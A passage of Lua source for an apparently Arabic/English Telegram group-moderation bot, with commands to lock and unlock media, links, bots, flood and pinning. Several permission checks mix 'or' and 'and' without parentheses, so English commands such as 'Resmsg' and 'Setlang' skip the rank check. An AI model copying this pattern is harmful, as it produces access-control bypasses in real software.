if text:match("^[Nn]amegp$") or text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اسم المجموعه '..title_name(msg.chat_id_)..'', 1, 'md')
end 

-----------------------------------------------------------------------------------------------
if text:match("^[Rr]esmsg$") or text:match("^تنظيف الرسائل$") and is_sudo(msg) then
botx1:del(BOT.."bot:allmsgs")
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ All msg received has been reset •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تنظيف عدد رسائل الكروبات •', 'md')
end
end
--------------------------------------------bot---------------------------------------------------
if text:match("^[Ss]etlang (.*)$") or text:match("^ضع اللغه (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local langs = {string.match(text, "^(.*) (.*)$")}
if langs[2] == "ar" or langs[2] == "العربيه" then
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🖱⁞ تم وضع اللغه العربيه مسبقا •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🖱⁞ تم وضع اللغه العربيه في المجموعه •', 1, 'md')
botx1:del(BOT..'lang:gp:'..msg.chat_id_)
end
end
if langs[2] == "en" or langs[2] == "الانكليزيه" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🖱⁞ *Language Bot is already English* •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🖱⁞ *Language Bot has been changed to English* •', 1, 'md')
botx1:set(BOT..'lang:gp:'..msg.chat_id_,true)
end
end
end
---------------------------------bot--------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
local unlockpt = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpt[2] == "edit" or unlockpts[2] == "التعديل" then
if botx1:get(BOT..'editmsg'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock edit ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التعديل • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'editmsg'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ edit is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التعديل سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "cmd" or unlockpts[2] == "الشارحه" then
if botx1:get(BOT..'bot:cmds'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock cmd ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الشارحه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:cmds'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ cmd is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الشارحه سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "bots" or unlockpts[2] == "البوتات" then
if botx1:get(BOT..'bot:bots:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:bots:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '📌⁞ تم فتح البوتات سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "bots ban" or unlockpts[2] == "البوتات بالطرد" then
if botx1:get(BOT..'bot:bots:ban'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots ban☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات بالطرد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 64, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:bots:ban'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked ban ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات بالطرد سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "bots keed" or unlockpts[2] == "البوتات بالتقييد" then
if botx1:get(BOT..'keed_bots'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots keed ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات بالتقييد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 66, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'keed_bots'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📌⁞ bots is already unlocked keed ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات بالتقييد سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "flood" or unlockpts[2] == "التكرار" then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock flood ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التكرار • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'anti-flood:'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ flood is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التكرار سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "pin" or unlockpts[2] == "التثبيت" then
if botx1:get(BOT..'bot:pin:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock pin ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التثبيت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:pin:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ pin is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التثبيت سابقا ✔️', 1, 'md')
end
end
end
end
end
------------------------------------bot-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock gtime (%d+)$") then
local mutept = {string.match(text, "^[Ll]ock gtime (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
botx1:setex(BOT..'bot:muteall'..msg.chat_id_, num, true)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Lock all has been enable for "..mutept[1].." hours •", 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم قفل الكل لمده "..mutept[1].." ساعه •", 'md')
end
end
if text:match("^قفل الكل بالساعات (%d+)$") then
local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
botx1:setex(BOT..'bot:muteall'..msg.chat_id_, num, true)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🎖⁞ Lock all has been enable for "..mutept[1].." hours •", 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم قفل الكل لمده "..mutept[1].." ساعه •", 'md')
end
end
end
-----------------------------------------bot------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") then
local mutept = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutept[2] == "all" or  mutepts[2] == "الكل" then 
if not botx1:get(BOT..'bot:text:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:inline:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:photo:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:spam:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:video:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:gifs:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:music:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:voice:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:links:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:location:mute'..msg.chat_id_) and not botx1:get(BOT..'tags:lock'..msg.chat_id_) and not botx1:get(BOT..'bot:strict'..msg.chat_id_) and not botx1:get(BOT..'bot:document:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:contact:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:english:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:sticker:mute'..msg.chat_id_) and not botx1:get(BOT..'markdown:lock'..msg.chat_id_) and not botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) and not botx1:get(BOT..'editmsg'..msg.chat_id_) and not botx1:get(BOT..'bot:cmds'..msg.chat_id_) and not botx1:get(BOT..'bot:bots:mute'..msg.chat_id_) and not botx1:get(BOT..'bot:bots:ban'..msg.chat_id_) and not botx1:get(BOT..'keed_bots'..msg.chat_id_) and not botx1:get(BOT..'anti-flood:'..msg.chat_id_) and not botx1:get(BOT..'bot:pin:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock all ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل كل الوسائط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 60, string.len(msg.sender_user_id_))
end 
botx1:set(BOT..'editmsg'..msg.chat_id_,true)
botx1:set(BOT..'bot:cmds'..msg.chat_id_,true)
botx1:set(BOT..'bot:bots:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:bots:ban'..msg.chat_id_,true)
botx1:set(BOT..'keed_bots'..msg.chat_id_,true)
botx1:set(BOT..'anti-flood:'..msg.chat_id_,true)
botx1:set(BOT..'bot:pin:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:text:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:inline:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:photo:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:spam:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:video:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:gifs:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:music:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:voice:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:links:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:location:mute'..msg.chat_id_,true)
botx1:set(BOT..'tags:lock'..msg.chat_id_,true)
botx1:set(BOT..'bot:strict'..msg.chat_id_,true)
botx1:set(BOT..'bot:document:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:hashtag:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:contact:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:webpage:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:arabic:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:english:mute'..msg.chat_id_,true)
botx1:set(BOT..'bot:sticker:mute'..msg.chat_id_,true)
botx1:set(BOT..'markdown:lock'..msg.chat_id_,true)
botx1:set(BOT..'bot:forward:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ all is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '📌⁞ تم قفل كل الوسائط سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "text" or mutepts[2] == "الدردشه" then
if not botx1:get(BOT..'bot:text:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📌⁞ Has been lock text ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الدردشه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:text:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ text is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الدردشه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "inline" or mutepts[2] == "الاونلاين" then
if not botx1:get(BOT..'bot:inline:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock inline ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الاونلاين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 59, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:inline:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ inline is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الاونلاين سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "photo" or mutepts[2] == "الصور" then
if not botx1:get(BOT..'bot:photo:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock photo ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الصور • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 55, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:photo:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ photo is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الصور سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "spam" or mutepts[2] == "الكلايش" then
if not botx1:get(BOT..'bot:spam:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock spam ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الكلايش • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:spam:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ spam is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الكلايش سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "video" or mutepts[2] == "الفيديو" then
if not botx1:get(BOT..'bot:video:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock video ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الفيديو • \n📚⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:video:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ video is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الفيديو سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "gif" or mutepts[2] == "المتحركه" then
if not botx1:get(BOT..'bot:gifs:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock gif ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل المتحركه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:gifs:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ gif is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل المتحركه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "music" or mutepts[2] == "الاغاني" then
if not botx1:get(BOT..'bot:music:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock music ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الاغاني • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:music:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ music is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الاغاني سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "voice" or mutepts[2] == "الصوت" then
if not botx1:get(BOT..'bot:voice:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock voice ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الصوت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 55, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:voice:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ voice is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الصوت سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "links" or mutepts[2] == "الروابط" then
if not botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock links ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الروابط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:links:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ links is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الروابط سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "location" or mutepts[2] == "المواقع" then
if not botx1:get(BOT..'bot:location:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock location ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل المواقع • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:location:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ location is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل المواقع سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "tag" or mutepts[2] == "المعرف" then
if not botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock tag ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل المعرف • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 56, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'tags:lock'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tag is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل المعرف سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "strict" or  mutepts[2] == "الحمايه" then
if not botx1:get(BOT..'bot:strict'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock strict ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الحمايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:strict'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ strict is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الحمايه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "file" or mutepts[2] == "الملفات" then
if not botx1:get(BOT..'bot:document:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock file ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الملفات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:document:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ file is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الملفات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "hashtag" or mutepts[2] == "الهاشتاك" then
if not botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock hashtag ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الهاشتاك • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:hashtag:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ hashtag is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الهاشتاك سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "contact" or mutepts[2] == "الجهات" then
if not botx1:get(BOT..'bot:contact:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock contact ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الجهات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 56, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:contact:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ contact is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الجهات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "webpage" or mutepts[2] == "الشبكات" then
if not botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock webpage ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الشبكات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
